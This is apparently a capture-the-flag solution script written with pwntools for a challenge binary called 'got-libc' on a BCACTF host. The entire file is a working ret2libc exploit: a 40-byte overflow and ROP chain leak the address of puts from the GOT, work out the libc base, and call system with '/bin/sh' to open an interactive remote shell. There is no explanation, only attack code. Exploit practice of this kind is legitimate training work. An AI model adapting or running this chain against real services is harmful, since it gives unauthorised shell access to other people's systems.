from pwn import *

context(terminal=['tmux','new-window'])

fname = './got-libc'
local = False

p = ELF(fname)
libc = ELF('libc-local.so.6') if local else ELF('libc-remote.so.6')

host,port = 'bin.bcactf.com',49176
r = process(fname) if local else remote(host,port)

pop_rdi = 0x0000000000401253
ret = 0x000000000040101a # for movaps issue

def header():
	r.recvuntil(b'?')

def send_payload1():	
	r.sendline(b'a'*40+p64(pop_rdi)+p64(p.got['puts'])+p64(p.plt['puts'])+p64(0x401176))

def send_payload2():
	bin_sh = next(libc.search(b'/bin/sh'))
	log.info('bin sh @ '+hex(bin_sh))	
	log.info('system @ '+hex(libc.sym['system']))
	r.sendline(b'a'*40+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(libc.sym['system']))

if __name__=='__main__':
	header()
	send_payload1()
	r.recvline()	
	puts = r.recv(8)[:6]
	puts = u64(puts+b'\x00'*(8-len(puts)))	
	log.info('puts @ '+hex(puts))
	
	libc.address = puts-libc.sym['puts']
	
	header()
	#gdb.attach(r)
	send_payload2()

	r.interactive()	
